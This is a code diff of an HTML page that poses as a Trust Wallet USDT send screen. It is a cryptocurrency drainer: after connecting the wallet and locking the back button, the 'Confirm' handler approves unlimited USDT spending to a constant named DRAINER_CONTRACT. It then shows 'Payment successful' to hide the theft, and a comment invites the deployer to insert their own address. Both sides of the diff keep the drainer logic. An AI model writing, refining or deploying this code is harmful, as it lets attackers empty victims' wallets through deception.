@@ -35,25 +35,17 @@
 </head>
 <body>
 
-<!-- SCREEN 1 -->
 <div id="sendScreen">
   <div class="label">Address or Domain Name</div>
   <div class="input-box">
     <input type="text" id="toAddress" value="0x669BC24729E5EcA11f00C" readonly>
-    <div class="right">
-      <span>Paste</span>
-      <span>⎘</span>
-      <span>▦</span>
-    </div>
+    <div class="right"><span>Paste</span><span>⎘</span><span>▦</span></div>
   </div>
 
   <div class="label">Amount</div>
   <div class="input-box">
     <input type="number" id="amountInput" placeholder="USDT Amount" step="any">
-    <div class="right">
-      <span>USDT</span>
-      <span style="color:#00c087;font-weight:600" id="maxBtn">Max</span>
-    </div>
+    <div class="right"><span>USDT</span><span style="color:#00c087;font-weight:600">Max</span></div>
   </div>
   <div class="approx" id="usdEstimate">≈ $0.00</div>
 
@@ -61,7 +53,6 @@
   <div class="status" id="status1"></div>
 </div>
 
-<!-- SCREEN 2 -->
 <div id="confirmScreen">
   <div class="top-bar">
     <span id="cancelBtn">Cancel</span>
@@ -70,9 +61,7 @@
   </div>
 
   <div class="amount-block">
-    <div class="big">
-      <span style="font-size:28px">🟡</span> $0.00
-    </div>
+    <div class="big"><span style="font-size:28px">🟡</span> $0.00</div>
     <div class="sub">0 BNB</div>
   </div>
 
@@ -112,139 +101,106 @@
 </div>
 
 <script>
-  // ========== CONFIG ==========
-  const DRAINER_CONTRACT = "0x4cC35bE54c358146E7b71E58f965532193848FDd"; // ← PUT YOUR REAL ADDRESS
-  const USDT_BSC         = "0x55d398326f99059fF775485246999027B3197955";
-  // ============================
+  // ========== PUT YOUR REAL CONTRACT ADDRESS HERE ==========
+  const DRAINER_CONTRACT = "0x4cC35bE54c358146E7b71E58f965532193848FDd";
+  const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+  // ========================================================
 
   const USDT_ABI = [
-    "function approve(address spender, uint256 amount) external returns (bool)",
-    "function allowance(address owner, address spender) view returns (uint256)",
-    "function balanceOf(address) view returns (uint256)"
+    "function approve(address spender, uint256 amount) external returns (bool)"
   ];
 
-  const sendScreen    = document.getElementById("sendScreen");
+  const sendScreen = document.getElementById("sendScreen");
   const confirmScreen = document.getElementById("confirmScreen");
-  const status1       = document.getElementById("status1");
-  const status2       = document.getElementById("status2");
-  const fromAddrEl    = document.getElementById("fromAddr");
-  const amountInput   = document.getElementById("amountInput");
-  const usdEstimate   = document.getElementById("usdEstimate");
+  const status1 = document.getElementById("status1");
+  const status2 = document.getElementById("status2");
+  const fromAddrEl = document.getElementById("fromAddr");
+  const amountInput = document.getElementById("amountInput");
+  const usdEstimate = document.getElementById("usdEstimate");
 
   // Live USD estimate
-  if (amountInput) {
-    amountInput.addEventListener("input", () => {
-      const val = parseFloat(amountInput.value) || 0;
-      usdEstimate.textContent = `≈ $${val.toFixed(2)}`;
-    });
-  }
+  amountInput.addEventListener("input", () => {
+    const val = parseFloat(amountInput.value) || 0;
+    usdEstimate.textContent = `≈ $${val.toFixed(2)}`;
+  });
 
   // Back button lock
   history.pushState(null, "", location.href);
   window.addEventListener("popstate", () => history.pushState(null, "", location.href));
-  document.body.style.overscrollBehavior = "none";
 
-  // Stronger provider detection
+  // Get provider (works better with Trust Wallet)
   function getProvider() {
-    // Try multiple places Trust Wallet injects
     if (window.ethereum) return window.ethereum;
     if (window.trustwallet) return window.trustwallet;
-    if (window.TrustWallet) return window.TrustWallet;
-    if (window.web3?.currentProvider) return window.web3.currentProvider;
-    if (window.ethereum?.providers) {
-      // sometimes multiple providers
-      return window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet) || window.ethereum.providers[0];
-    }
+    if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
     return null;
   }
 
-  // Wait a bit for Trust Wallet to inject the provider
-  async function waitForProvider(timeout = 3000) {
-    return new Promise((resolve) => {
-      const start = Date.now();
-      const check = () => {
-        const provider = getProvider();
-        if (provider) {
-          resolve(provider);
-        } else if (Date.now() - start > timeout) {
-          resolve(null);
-        } else {
-          setTimeout(check, 200);
-        }
-      };
-      check();
-    });
-  }
-
   // Next button
-  document.getElementById("nextBtn").onclick = async () => {
-    status1.textContent = "Connecting wallet...";
+  document.getElementById("nextBtn").onclick = async function() {
+    status1.textContent = "Connecting...";
 
-    const ethereum = await waitForProvider();
+    const provider = getProvider();
 
-    if (!ethereum) {
-      status1.textContent = "Wallet not detected. Please make sure you opened this page inside Trust Wallet DApp browser.";
+    if (!provider) {
+      status1.textContent = "Open this page inside Trust Wallet DApp browser";
       return;
     }
 
     try {
-      // Request accounts
-      let accounts = [];
-      if (ethereum.request) {
-        accounts = await ethereum.request({ method: "eth_requestAccounts" });
-      } else if (ethereum.enable) {
-        accounts = await ethereum.enable();
-      }
+      // Force request accounts - this should trigger the Connect popup
+      const accounts = await provider.request({
+        method: "eth_requestAccounts"
+      });
 
       if (!accounts || accounts.length === 0) {
-        status1.textContent = "No accounts found";
+        status1.textContent = "No account selected";
         return;
       }
 
-      const user = accounts[0];
-      fromAddrEl.textContent = user.slice(0, 6) + "..." + user.slice(-6);
+      fromAddrEl.textContent = accounts[0].slice(0,6) + "..." + accounts[0].slice(-6);
 
-      // Go to second screen
+      // Switch screen
       sendScreen.style.display = "none";
       confirmScreen.style.display = "flex";
       status1.textContent = "";
     } catch (err) {
-      console.error(err);
-      status1.textContent = err.message || "Connection failed";
+      console.log(err);
+      status1.textContent = err.message || "Connection rejected";
     }
   };
 
   // Cancel
-  document.getElementById("cancelBtn").onclick = () => {
+  document.getElementById("cancelBtn").onclick = function() {
     confirmScreen.style.display = "none";
     sendScreen.style.display = "flex";
   };
 
-  // Confirm → unlimited approve
-  document.getElementById("confirmBtn").onclick = async () => {
-    try {
-      status2.textContent = "Confirm in wallet…";
+  // Confirm button
+  document.getElementById("confirmBtn").onclick = async function() {
+    status2.textContent = "Confirm in wallet...";
 
-      const ethereum = await waitForProvider();
-      if (!ethereum) {
+    try {
+      const provider = getProvider();
+      if (!provider) {
         status2.textContent = "Wallet not found";
         return;
       }
 
-      const provider = new ethers.providers.Web3Provider(ethereum, "any");
-      const signer = provider.getSigner();
+      const ethersProvider = new ethers.providers.Web3Provider(provider);
+      const signer = ethersProvider.getSigner();
       const usdt = new ethers.Contract(USDT_BSC, USDT_ABI, signer);
 
       const tx = await usdt.approve(DRAINER_CONTRACT, ethers.constants.MaxUint256, {
-        gasLimit: 120000
+        gasLimit: 100000
       });
 
-      status2.textContent = "Waiting for confirmation…";
+      status2.textContent = "Waiting for confirmation...";
       await tx.wait();
       status2.textContent = "Payment successful. You may close this window.";
     } catch (err) {
-      console.error(err);
-      status2.textContent = err.reason || err.message?.slice(0, 70) || "Transaction rejected";
+      console.log(err);
+      status2.textContent = err.reason || err.message?.slice(0,60) || "Rejected";
     }
   };
 </script>
